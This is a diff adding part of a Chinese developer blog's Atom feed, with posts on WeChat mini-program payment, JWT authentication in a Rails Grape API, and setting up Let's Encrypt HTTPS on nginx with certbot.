+      <span class="na">duration</span><span class="p">:</span> <span class="mi">2000</span>
+    <span class="p">});</span>
+  <span class="p">},</span>
+  <span class="dl">'</span><span class="s1">fail</span><span class="dl">'</span><span class="p">:</span> <span class="kd">function</span> <span class="nx">fail</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">支付失败</span><span class="dl">"</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">});</span>
+
+</code></pre></div></div>]]></content><author><name>xifengzhu</name></author><category term="Rails" /><summary type="html"><![CDATA[Rails 微信小程序支付]]></summary></entry><entry><title type="html">Rails grape 项目集成JWT验证</title><link href="xifengzhu.github.com/rails/2017/06/28/rails-grape-%E9%A1%B9%E7%9B%AE%E9%9B%86%E6%88%90jwt%E9%AA%8C%E8%AF%81.html" rel="alternate" type="text/html" title="Rails grape 项目集成JWT验证" /><published>2017-06-28T00:00:00+00:00</published><updated>2017-06-28T00:00:00+00:00</updated><id>xifengzhu.github.com/rails/2017/06/28/rails-grape-%E9%A1%B9%E7%9B%AE%E9%9B%86%E6%88%90jwt%E9%AA%8C%E8%AF%81</id><content type="html" xml:base="xifengzhu.github.com/rails/2017/06/28/rails-grape-%E9%A1%B9%E7%9B%AE%E9%9B%86%E6%88%90jwt%E9%AA%8C%E8%AF%81.html"><![CDATA[<h2 id="jwt简介">JWT简介</h2>
+
+<p>官方描述：</p>
+
+<blockquote>
+  <p>JSON Web Tokens are an open, industry standard RFC 7519 method for representing claims securely between two parties.
+JWT.IO allows you to decode, verify and generate JWT.
+我们来看看 <code class="language-plaintext highlighter-rouge">jwt</code> 生成的东西</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaaaa.bbbbbbb.ccccccc
+</code></pre></div></div>
+
+<p>第一部分是 <code class="language-plaintext highlighter-rouge">header</code>， 第二个部分是 <code class="language-plaintext highlighter-rouge">payload</code>， 第三部分是 <code class="language-plaintext highlighter-rouge">signature</code></p>
+
+<h4 id="header-部分">Header 部分</h4>
+
+<p><code class="language-plaintext highlighter-rouge">header</code> 部分解密之后为两部分，例如:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HS256"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h4 id="payload部分">Payload部分</h4>
+
+<p><code class="language-plaintext highlighter-rouge">payload</code> 部分为 <code class="language-plaintext highlighter-rouge">JWT</code> 声明。 声明有三种类型 - 私人，公开和注册</p>
+
+<ul>
+  <li>
+    <p>注册声明是其名称被保留但不是强制性使用的索赔。 例如 - iss，sub，aud等</p>
+  </li>
+  <li>
+    <p>私人声明是双方同意的名称，可能与其他公开声明相冲突。 必须谨慎使用。</p>
+  </li>
+  <li>
+    <p>公开声明 - 根据我们的认证要求（如用户名，用户信息等）可以创建的声明。</p>
+  </li>
+</ul>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"iss"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sitepoint.com"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Devdatta Kane"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"admin"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>这个被 <code class="language-plaintext highlighter-rouge">encode</code> 之后就变成一串 <code class="language-plaintext highlighter-rouge">hash</code>，成为<code class="language-plaintext highlighter-rouge">jwt token</code>第二部分</p>
+
+<h4 id="signature-部分">Signature 部分</h4>
+
+<p><code class="language-plaintext highlighter-rouge">Signature</code> 也可能是最重要的部分, 它是由 <code class="language-plaintext highlighter-rouge">Header</code>，<code class="language-plaintext highlighter-rouge">Payload</code>和 <code class="language-plaintext highlighter-rouge">Secret</code> 生成的一串 <code class="language-plaintext highlighter-rouge">hash</code>。我们通过具有 <code class="language-plaintext highlighter-rouge">secret</code> 的 <code class="language-plaintext highlighter-rouge">HMACSHA256</code> 功能作为服务器端密码运行头部和有效负载的组合字符串。 像这样：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require "openssl"
+require "base64"
+var encodedString = Base64.encode64(header) + "." + Base64.encode64(payload);
+hash  = OpenSSL::HMAC.digest("sha256", "secret", encodedString)
+</code></pre></div></div>
+
+<p>由于只有服务器知道这个 <code class="language-plaintext highlighter-rouge">secret</code> ，所以没有人可以篡改 <code class="language-plaintext highlighter-rouge">payload</code>，并且服务器可以使用 <code class="language-plaintext highlighter-rouge">signature</code> 来检测任何篡改。</p>
+
+<h2 id="jwt-in-rails-with-grape">JWT in Rails with Grape</h2>
+
+<h4 id="1-首先添加-gem-jwt-到-gemfile-然后-bundle-install">1. 首先添加 <code class="language-plaintext highlighter-rouge">gem 'jwt'</code> 到 <code class="language-plaintext highlighter-rouge">Gemfile</code>, 然后 <code class="language-plaintext highlighter-rouge">bundle install</code></h4>
+
+<h4 id="2-然后在-lib--json_web_tokenrb-中创建一个名为-jsonwebtoken-的类-该类将封装jwt令牌的编码和解码逻辑-像这样">2. 然后在 <code class="language-plaintext highlighter-rouge">lib / json_web_token.rb</code> 中创建一个名为 <code class="language-plaintext highlighter-rouge">JsonWebToken</code> 的类。 该类将封装JWT令牌的编码和解码逻辑。 像这样：</h4>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'jwt'</span>
+
+<span class="k">class</span> <span class="nc">JsonWebToken</span>
+  <span class="c1"># Encodes and signs JWT Payload with expiration</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">.</span><span class="nf">reverse_merge!</span><span class="p">(</span><span class="n">meta</span><span class="p">)</span>
+    <span class="no">JWT</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">secrets</span><span class="p">.</span><span class="nf">secret_key_base</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Decodes the JWT with the signed secret</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+    <span class="no">JWT</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">secrets</span><span class="p">.</span><span class="nf">secret_key_base</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Validates the payload hash for expiration and meta claims</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">valid_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">expired</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">||</span> <span class="n">payload</span><span class="p">[</span><span class="s1">'client'</span><span class="p">]</span> <span class="o">!=</span> <span class="n">meta</span><span class="p">[</span><span class="ss">:client</span><span class="p">]</span>
+      <span class="k">return</span> <span class="kp">false</span>
+    <span class="k">else</span>
+      <span class="k">return</span> <span class="kp">true</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Default options to be encoded in the token</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">meta</span>
+    <span class="p">{</span>
+      <span class="ss">expired_at: </span><span class="mi">7</span><span class="p">.</span><span class="nf">days</span><span class="p">.</span><span class="nf">from_now</span><span class="p">.</span><span class="nf">to_i</span><span class="p">,</span>
+      <span class="ss">client: </span><span class="s1">'wechat_app'</span><span class="p">,</span>
+    <span class="p">}</span>
+  <span class="k">end</span>
+
+  <span class="c1"># Validates if the token is expired by exp parameter</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">expired</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="no">Time</span><span class="p">.</span><span class="nf">at</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="s1">'expired_at'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="no">Time</span><span class="p">.</span><span class="nf">now</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<h4 id="3-为-grape-添加一个-helper-方法如下">3. 为 <code class="language-plaintext highlighter-rouge">grape</code> 添加一个 <code class="language-plaintext highlighter-rouge">helper</code> 方法，如下：</h4>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">module</span> <span class="nn">Helpers</span>
+  <span class="k">module</span> <span class="nn">AuthenticationHelper</span>
+
+    <span class="c1"># Returns 401 response. To handle malformed / invalid requests.</span>
+    <span class="k">def</span> <span class="nf">unauthenticated!</span>
+      <span class="n">error!</span> <span class="s1">'401 Unauthorized'</span><span class="p">,</span> <span class="mi">401</span>
+    <span class="k">end</span>
+
+    <span class="c1"># Validates the token and user and sets the @current_user scope</span>
+    <span class="k">def</span> <span class="nf">authenticate!</span>
+      <span class="k">if</span> <span class="o">!</span><span class="n">payload</span> <span class="o">||</span> <span class="o">!</span><span class="no">JsonWebToken</span><span class="p">.</span><span class="nf">valid_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="nf">first</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">unauthenticated!</span>
+      <span class="k">end</span>
+      <span class="n">unauthenticated!</span> <span class="k">unless</span> <span class="n">current_user</span>
+    <span class="k">end</span>
+
+    <span class="kp">private</span>
+    <span class="c1"># Deconstructs the Authorization header and decodes the JWT token.</span>
+    <span class="k">def</span> <span class="nf">payload</span>
+      <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'Authorization'</span><span class="p">]</span>
+      <span class="no">JsonWebToken</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+    <span class="k">rescue</span>
+      <span class="kp">nil</span>
+    <span class="k">end</span>
+
+    <span class="c1"># Sets the @current_user with the access_token from payload</span>
+    <span class="k">def</span> <span class="nf">current_user</span>
+      <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'user_id'</span><span class="p">]</span>
+        <span class="vi">@current_user</span> <span class="o">||=</span> <span class="no">User</span><span class="p">.</span><span class="nf">find_by_wechat_open_id</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'user_id'</span><span class="p">])</span>
+      <span class="k">else</span>
+        <span class="kp">nil</span>
+      <span class="k">end</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<h4 id="4-在用户登录的时候-调用jwt生成一个access_token-以后每次调用api加上header-authorization-access_token">4. 在用户登录的时候 调用JWT生成一个<code class="language-plaintext highlighter-rouge">access_token</code>, 以后每次调用API加上Header <code class="language-plaintext highlighter-rouge">Authorization ${access_token}</code></h4>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span> <span class="o">=</span> <span class="no">User</span><span class="p">.</span><span class="nf">find_by</span><span class="p">(</span><span class="ss">email: </span><span class="n">params</span><span class="p">[</span><span class="ss">:email</span><span class="p">])</span>
+<span class="k">if</span> <span class="n">user</span> <span class="o">&amp;&amp;</span> <span class="n">user</span><span class="p">.</span><span class="nf">valid_password?</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:password</span><span class="p">])</span>
+  <span class="p">{</span> <span class="ss">access_token: </span><span class="no">JsonWebToken</span><span class="p">.</span><span class="nf">encode</span><span class="p">({</span><span class="ss">user_id: </span><span class="n">user</span><span class="p">.</span><span class="nf">id</span><span class="p">})</span> <span class="p">}</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<h4 id="5-在需要验证用户的api-中-helpers-helpersauthenticationhelper-并且在调用逻辑代码之前-执行-authenticate就行了">5. 在需要验证用户的<code class="language-plaintext highlighter-rouge">API</code> 中 <code class="language-plaintext highlighter-rouge">helpers ::Helpers::AuthenticationHelper</code> 并且在调用逻辑代码之前 执行 <code class="language-plaintext highlighter-rouge">authenticate!</code>就行了。</h4>]]></content><author><name>xifengzhu</name></author><category term="Rails" /><summary type="html"><![CDATA[Rails grape 项目集成JWT验证]]></summary></entry><entry><title type="html">使用 Let’s Encrypt 加密(HTTPS)你的网站</title><link href="xifengzhu.github.com/%E9%83%A8%E7%BD%B2/2017/05/09/%E4%BD%BF%E7%94%A8-Let-s-Encrypt-%E5%8A%A0%E5%AF%86(HTTPS)%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99.html" rel="alternate" type="text/html" title="使用 Let’s Encrypt 加密(HTTPS)你的网站" /><published>2017-05-09T00:00:00+00:00</published><updated>2017-05-09T00:00:00+00:00</updated><id>xifengzhu.github.com/%E9%83%A8%E7%BD%B2/2017/05/09/%E4%BD%BF%E7%94%A8%20Let%E2%80%99s%20Encrypt%20%E5%8A%A0%E5%AF%86(HTTPS)%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99</id><content type="html" xml:base="xifengzhu.github.com/%E9%83%A8%E7%BD%B2/2017/05/09/%E4%BD%BF%E7%94%A8-Let-s-Encrypt-%E5%8A%A0%E5%AF%86(HTTPS)%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99.html"><![CDATA[<p>使用 Let’s Encrypt 加密(HTTPS)你的网站</p>
+
+<h4 id="下载-lets-encrypt-客户端">下载 Let’s Encrypt 客户端</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>git clone https://github.com/certbot/certbot /opt/letsencrypt
+</code></pre></div></div>
+
+<h4 id="允许-lets-encrypt-访问文件">允许 Let’s Encrypt 访问文件</h4>
+
+<p>修改NGINX配置，允许 Let’s Encrypt 访问文件</p>
+
+<ol>
+  <li>将此位置块添加到 HTTP 通信的虚拟服务器</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server <span class="o">{</span>
+  listen 80 default_server<span class="p">;</span>
+  server_name activity-api.724.org.cn<span class="p">;</span>
+
+  location /.well-known/acme-challenge <span class="o">{</span>
+    root /var/www/724activity_staging/current/public<span class="p">;</span>
+  <span class="o">}</span>
+  ...
+<span class="o">}</span>
+</code></pre></div></div>
+<ol>
+  <li>在语法上验证配置文件并且重启 nginx 服务</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo service nginx restart
+</code></pre></div></div>
+
+<h4 id="为域名请求证书">为域名请求证书</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./certbot-auto certonly -d activity-api.724.org.cn -d activity-wechat.724.org.cn
+</code></pre></div></div>
+
+<p>可能出现如下错误：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">"/usr/lib/python3/dist-packages/virtualenv.py"</span>, line 2363, <span class="k">in</span> &lt;module&gt;
+    main<span class="o">()</span>
+  File <span class="s2">"/usr/lib/python3/dist-packages/virtualenv.py"</span>, line 719, <span class="k">in </span>main
+    <span class="nv">symlink</span><span class="o">=</span>options.symlink<span class="o">)</span>
+  File <span class="s2">"/usr/lib/python3/dist-packages/virtualenv.py"</span>, line 988, <span class="k">in </span>create_environment
+    <span class="nv">download</span><span class="o">=</span>download,
+  File <span class="s2">"/usr/lib/python3/dist-packages/virtualenv.py"</span>, line 918, <span class="k">in </span>install_wheel
+    call_subprocess<span class="o">(</span>cmd, <span class="nv">show_stdout</span><span class="o">=</span>False, <span class="nv">extra_env</span><span class="o">=</span><span class="nb">env</span>, <span class="nv">stdin</span><span class="o">=</span>SCRIPT<span class="o">)</span>
+  File <span class="s2">"/usr/lib/python3/dist-packages/virtualenv.py"</span>, line 812, <span class="k">in </span>call_subprocess
+    % <span class="o">(</span>cmd_desc, proc.returncode<span class="o">))</span>
+OSError: Command /opt/eff.org/certbot/venv/bin/python2.7 - setuptools pkg_resources pip wheel failed with error code 1
+</code></pre></div></div>
+
+<p>解决方法：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">export </span><span class="nv">LC_ALL</span><span class="o">=</span><span class="s2">"en_US.UTF-8"</span>
+<span class="nv">$ </span><span class="nb">export </span><span class="nv">LC_CTYPE</span><span class="o">=</span><span class="s2">"en_US.UTF-8"</span>
+</code></pre></div></div>
+
+<p>选择将证书安装在  <code class="language-plaintext highlighter-rouge">webroot</code> 下面</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>How would you like to authenticate with the ACME CA?
+<span class="nt">-------------------------------------------------------------------------------</span>
+1: Nginx Web Server plugin - Alpha <span class="o">(</span>nginx<span class="o">)</span>
+2: Spin up a temporary webserver <span class="o">(</span>standalone<span class="o">)</span>
+3: Place files <span class="k">in </span>webroot directory <span class="o">(</span>webroot<span class="o">)</span>
+<span class="nt">-------------------------------------------------------------------------------</span>
+Select the appropriate number <span class="o">[</span>1-3] <span class="k">then</span> <span class="o">[</span>enter] <span class="o">(</span>press <span class="s1">'c'</span> to cancel<span class="o">)</span>: 3
+</code></pre></div></div>
+
+<p>输入项目部署的地址, 例如: <code class="language-plaintext highlighter-rouge">/var/www/kdaibiao/current/public</code></p>
+
+<h4 id="在-nginx-中添加证书配置">在 NGINX 中添加证书配置</h4>
+
+<ol>
+  <li>将证书和密钥添加到 HTTP 通信的服务器块</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server <span class="o">{</span>
+  listen 443 ssl default_server<span class="p">;</span>
+  server_name activity-api.724.org.cn<span class="p">;</span>
+
+  ssl_certificate /etc/letsencrypt/live/activity-api.724.org.cn/fullchain.pem<span class="p">;</span>
+  ssl_certificate_key /etc/letsencrypt/live/activity-api.724.org.cn/privkey.pem<span class="p">;</span>
+  ...
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>在语法上验证配置文件并且重启 nginx 服务并加载证书</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>service nginx restart
+</code></pre></div></div>
+
+<h4 id="自动续期">自动续期</h4>
+
+<p>Certbot 可以配置为在到期之前自动续订您的证书。加密证书有效期为 90 天，自动续期功能非常实用。通过运行此命令，您可以为您的证书测试自动续订</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./opt/letsencrypt/certbot-auto renew <span class="nt">--dry-run</span>
+</code></pre></div></div>
+
+<p>如果上述命令正确工作，可以为您安排自动更新添加一个 cron 或systemd 的任务，运行以下︰</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//执行
+<span class="nb">sudo </span>crontab <span class="nt">-e</span>
+//添加一行
+30 4 <span class="k">*</span> <span class="k">*</span> 1 /opt/letsencrypt/letsencrypt-auto renew <span class="nt">--renew-hook</span> <span class="s2">"service nginx restart"</span> <span class="nt">--quiet</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+</code></pre></div></div>
+
+<h4 id="refs">Refs</h4>
+<ul>
+  <li>https://certbot.eff.org/#ubuntuother-nginx</li>
+  <li>https://www.nginx.com/blog/free-certificates-lets-encrypt-and-nginx/</li>
+</ul>]]></content><author><name>xifengzhu</name></author><category term="部署" /><summary type="html"><![CDATA[使用 Let’s Encrypt 加密(HTTPS)你的网站]]></summary></entry></feed>
